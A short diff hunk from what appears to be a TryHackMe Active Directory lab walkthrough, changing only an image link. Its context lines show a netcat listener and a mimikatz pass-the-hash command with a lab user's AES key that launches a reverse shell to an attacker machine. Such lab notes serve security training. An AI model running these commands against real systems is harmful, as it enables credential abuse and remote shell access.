@@ -796,7 +796,7 @@ nc -lvp 5556
 sekurlsa::pth /user:t1_toby.beck  /domain:za.tryhackme.com /aes256:6a0d48f79acaec013d928d84a102b72028d574340b6139e876e179db48fbde4e    /run:"c:\tools\nc64.exe -e cmd.exe $KALI 5556"
 ```
 
-![](<../../.gitbook/assets/image (11) (1) (2).png>)
+![](<../../.gitbook/assets/image (11) (1) (2) (2).png>)
 
 
 
